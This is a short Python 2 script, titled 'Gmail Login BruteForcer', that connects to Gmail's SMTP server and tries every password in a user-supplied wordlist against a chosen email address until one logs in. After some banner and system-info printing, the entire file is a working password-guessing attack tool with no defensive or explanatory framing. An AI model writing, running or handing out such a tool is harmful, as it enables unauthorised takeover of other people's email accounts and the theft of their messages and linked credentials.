import smtplib
import datetime
import sys
import platform

print "**********Gmail Login BruteForcer**********"

print "**************************************************"

print "**********Authon : Ahmed Safa***********************"


print "**************************************************"

print "***************************************"




#Info
os = platform.system()
sys = platform.release()
print ("Operating System : " +os)
print sys
print("+++++++++++++++++++++++++++++++++++++")
current_time = datetime.datetime.now()
print current_time
print ("********************************")

server = smtplib.SMTP("smtp.gmail.com", 587)
server.ehlo()
server.starttls()

username = raw_input("Enter the Email : ")
passwordfile = raw_input("Enter the Wordlist : ")
passwordfile = open(passwordfile,"r")

for password in passwordfile:

	try:

		server.login(username,password)

		print "[+] Password Found : %s"%password
		break;

	except smtplib.SMTPAuthenticationError:

		print "[!] Password not Found : %s " %password
